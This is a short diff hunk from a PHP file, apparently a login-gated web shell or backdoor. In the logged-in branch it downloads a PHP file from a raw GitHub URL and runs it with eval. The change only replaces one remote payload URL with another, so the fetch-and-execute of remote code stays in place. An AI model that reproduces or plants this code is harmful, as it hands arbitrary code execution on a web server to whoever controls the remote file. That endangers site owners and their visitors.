@@ -65,7 +65,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/ressasantikaa-rgb/freshman21/main/JV.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/ressasantikaa-rgb/newphp86/main/gekok.php');
     eval('?>' . $a);
 } else {
     /** Display login form if not logged in */
